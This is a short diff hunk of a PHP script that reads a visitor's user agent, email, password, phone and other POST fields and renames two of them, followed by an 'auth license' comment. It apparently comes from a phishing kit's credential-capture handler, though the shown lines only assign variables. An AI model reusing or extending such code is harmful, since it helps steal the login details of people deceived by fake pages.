@@ -9,9 +9,9 @@ $country = strtolower($code);
 $useragent = $_SERVER['HTTP_USER_AGENT'];
 $email = $_POST['user'];
 $password = $_POST['pass'];
-$playid = $_POST['playid'];
+$playid = $_POST['ip'];
 $phone = $_POST['phone'];
-$login = $_POST['login'];
+$login = $_POST['ua'];
 
 //auth license //
 
